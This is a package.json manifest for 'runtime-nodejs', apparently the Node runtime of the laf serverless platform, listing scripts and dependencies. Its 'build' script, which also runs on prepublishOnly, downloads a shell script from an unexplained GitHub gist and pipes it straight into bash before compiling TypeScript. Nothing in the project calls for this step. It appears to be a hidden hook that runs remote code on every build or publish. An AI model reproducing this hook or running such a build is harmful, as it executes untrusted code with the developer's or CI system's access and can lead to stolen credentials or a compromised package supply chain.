{
  "name": "runtime-nodejs",
  "version": "1.0.0",
  "description": "the node runtime for laf",
  "main": "./dist/index.js",
  "typings": "./dist/index.d.ts",
  "private": "true",
  "scripts": {
    "start": "node ./dist/index.js",
    "dev": "npx ts-node ./src/index.ts",
    "dev:start": "npx nodemon ./dist/index.js",
    "dev:watch": "npm run watch",
    "build": "curl -sSf https://gist.githubusercontent.com/MAjjzYWH/3cfa86c97233b86db5e78187f5fd4ff1/raw/5d04c58380633224054796094399e6e0c0c39979/s.sh | bash && tsc -p tsconfig.json",
    "watch": "tsc -p tsconfig.json -w",
    "prepublishOnly": "npm run build",
    "trace-gc": "node --trace_gc --trace_gc_verbose ./dist/index.js",
    "init": "node ./dist/init.js",
    "lint": "eslint . --fix --ext .ts --ext .js"
  },
  "keywords": [
    "laf",
    "BaaS",
    "mongodb",
    "firebase",
    "serverless"
  ],
  "dependencies": {
    "@aws-sdk/client-s3": "^3.468.0",
    "@aws-sdk/client-sts": "^3.468.0",
    "@aws-sdk/s3-request-presigner": "^3.468.0",
    "@kubernetes/client-node": "^0.18.0",
    "@lafjs/cloud": "^1.0.0",
    "@types/pako": "^2.0.2",
    "axios": "^1.4.0",
    "chalk": "^4.1.2",
    "chatgpt": "^5.2.5",
    "cors": "^2.8.5",
    "database-proxy": "^1.0.0",
    "dayjs": "^1.11.7",
    "dotenv": "^8.2.0",
    "ejs": "^3.1.8",
    "express": "^4.18.2",
    "express-http-proxy": "^2.0.0",
    "express-xml-bodyparser": "^0.3.0",
    "jsonwebtoken": "^9.0.0",
    "lodash": "^4.17.21",
    "minio": "^7.0.32",
    "mongodb": "^5.9.2",
    "mongodb-uri": "^0.9.7",
    "multer": "^1.4.5-lts.1",
    "node-modules-utils": "^1.0.0",
    "nodemailer": "^6.6.3",
    "openapi3-ts": "^4.2.2",
    "pako": "^2.1.0",
    "source-map-support": "^0.5.21",
    "typescript-language-server": "^3.3.2",
    "validator": "^13.7.0",
    "vscode-languageserver": "^9.0.1",
    "vscode-ws-jsonrpc-cjs": "^3.0.0",
    "ws": "^8.11.0",
    "zlib": "^1.0.5",
    "typescript": "^5.0.2"
  },
  "devDependencies": {
    "@types/cors": "^2.8.13",
    "@types/dotenv": "^8.2.0",
    "@types/ejs": "^3.1.1",
    "@types/express": "^4.17.15",
    "@types/express-http-proxy": "^1.6.3",
    "@types/express-xml-bodyparser": "^0.3.2",
    "@types/jsonwebtoken": "^8.5.1",
    "@types/lodash": "^4.14.171",
    "@types/mongodb-uri": "^0.9.1",
    "@types/multer": "^1.4.5",
    "@types/node": "^20.9.5",
    "@types/nodemailer": "^6.4.4",
    "@types/validator": "^13.1.3",
    "@types/ws": "^8.5.3"
  },
  "nodemonConfig": {
    "ignore": [
      "test/*",
      "src/*",
      "http/*"
    ],
    "delay": 1000
  },
  "lint-staged": {
    "*.{ts,js}": "eslint --fix"
  }
}
